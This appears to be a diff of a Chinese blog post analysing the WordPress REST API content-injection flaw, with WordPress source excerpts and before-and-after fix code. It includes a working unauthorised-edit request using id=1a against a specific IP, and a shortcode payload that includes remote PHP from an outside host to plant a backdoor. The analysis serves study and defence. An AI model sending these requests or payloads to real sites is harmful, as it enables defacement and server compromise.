@@ -94,15 +94,16 @@ REST API到底是个什么东西？有什么用呢？
 
 这里借助<kbd>BurpSuite</kbd>使用<kbd>Update</kbd>功能来修改id为1的文章标题为<kbd>Attack test</kbd>
 
-`POST /wordpress/index.php/wp-json/wp/v2/posts/1?id=1a HTTP/1.1
+{% highlight html%}
+POST /wordpress/index.php/wp-json/wp/v2/posts/1?id=1a HTTP/1.1
 Host: 101.200.61.215
 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
 Connection: close
 Content-Type: application/json
 Content-Length: 23
 
-{"title":"Attack test"}`
-
+{"title":"Attack test"}
+{% endhighlight %}
 查看一下返回：
 {% capture images %}
 	http://i2.muimg.com/589989/00b5e862edef9e4a.png
@@ -203,24 +204,73 @@ Content-Length: 23
 
 
 不难发现唯一一处限制参数<kbd>id</kbd>的就是第一条<kbd>if</kbd>语句,只要将<kbd>$post</kbd>置为空，函数就会<kbd>return true</kbd>,成功绕过权限检查。跟进<kbd>get_post</kbd>方法。
+{% highlight html %}
+    function get_post( $post = null, $output = OBJECT, $filter = 'raw' ) {  
+        if ( empty( $post ) && isset( $GLOBALS['post'] ) )
+            $post = $GLOBALS['post'];
 
+        if ( $post instanceof WP_Post ) {
+            $_post = $post;
+        } elseif ( is_object( $post ) ) {
+            if ( empty( $post->filter ) ) {
+                $_post = sanitize_post( $post, 'raw' );
+                $_post = new WP_Post( $_post );
+            } elseif ( 'raw' == $post->filter ) {
+                $_post = new WP_Post( $post );
+            } else {
+                $_post = WP_Post::get_instance( $post->ID );
+            }
+        } else {
+            $_post = WP_Post::get_instance( $post );
+        }
 
-
+        if ( ! $_post )
+            return null;	
+	
+    }
+{% endhighlight %}
 
 调用了wp-post中的<kbd>get_instance</kbd>方法，再次跟进
+{% highlight html %}
+    public static function get_instance( $post_id ) {
+        global $wpdb;
 
+        if ( ! is_numeric( $post_id ) || $post_id != floor( $post_id ) || ! $post_id ) {
+            return false;
+        }
 
+        $post_id = (int) $post_id;
+
+        $_post = wp_cache_get( $post_id, 'posts' );
+
+        if ( ! $_post ) {
+            $_post = $wpdb->get_row( $wpdb->prepare( "SELECT * FROM $wpdb->posts WHERE ID = %d LIMIT 1", $post_id ) );
+
+            if ( ! $_post )
+                return false;
+
+            $_post = sanitize_post( $_post, 'raw' );
+            wp_cache_add( $_post->ID, $_post, 'posts' );
+        } elseif ( empty( $_post->filter ) ) {
+            $_post = sanitize_post( $_post, 'raw' );
+        }
+
+        return new WP_Post( $_post );
     
-    
-
+    }
+{% endhighlight %}
 
 分析第一条<kbd>if</kbd>语句可以得知，当<kbd>$post_id</kbd>不是纯数字时，该方法返回<kbd>false</kbd>导致<kbd>get_post</kbd>方法返回<kbd>null</kbd>，这样一来<kbd>update_item_permissions_check</kbd>方法中的$post为空，至此，成功绕过权限检查。
 
 再来看<kbd>update_item</kbd>方法
 
+{% highlight html %}
+    public function update_item( $request ) {
+        $id = (int) $request['id'];
 
-      
-
+        $comment = get_comment( $id );
+        ......
+{% endhighlight %}
 
 在这里参数<kbd>id</kbd>被直接转为了<kbd>int</kbd>型,这里演示一下这样会造成什么结果。
 
@@ -237,9 +287,9 @@ Content-Length: 23
 
 如果存在漏洞的WordPress安装了如 <kbd>insert_php</kbd>,<kbd>exec_php</kbd>等允许页面执行PHP代码的插件，可以构造数据包上传
 
-
-
-
+{% highlight html %}
+content<spanclass="token punctuation">:</span>"<span class="tokenpunctuation">[</span>insert_php<span class="tokenpunctuation">]</span> <span class="tokenkeyword">include</span><span class="tokenpunctuation">(</span>'http<span class="tokenpunctuation">[</span><span class="tokenpunctuation">:</span><span class="tokencomment">]//acommeamour.fr/tmp/xx.php'); [/insert_php][php] include('http[:]//acommeamour.fr/tmp/xx.php'); [/php]","id":"61a"}  </span>
+{% endhighlight %}
 
 木马被插件当做PHP代码执行，导致植入后门。
 
@@ -248,12 +298,25 @@ Content-Length: 23
 
 修复前：
 
+{% highlight html %}
+    public static function get_instance( $post_id ) {
+        global $wpdb;
 
+        if ( ! is_numeric( $post_id ) || $post_id != floor( $post_id ) || ! $post_id ) {
+            return false;
+    }
+{% endhighlight %}
 
 修复后： 
 
-     
+{% highlight html %}
+    public static function get_instance( $post_id ) {
+        global $wpdb;
 
+        if ( !$post_id ) {
+            return false;
+        }
+{% endhighlight %}
 
 改动很简单，修改了对<kbd>$post_id</kbd>判断逻辑，消除了以这种形式<kbd>id=1a</kbd>绕过的可能。
 
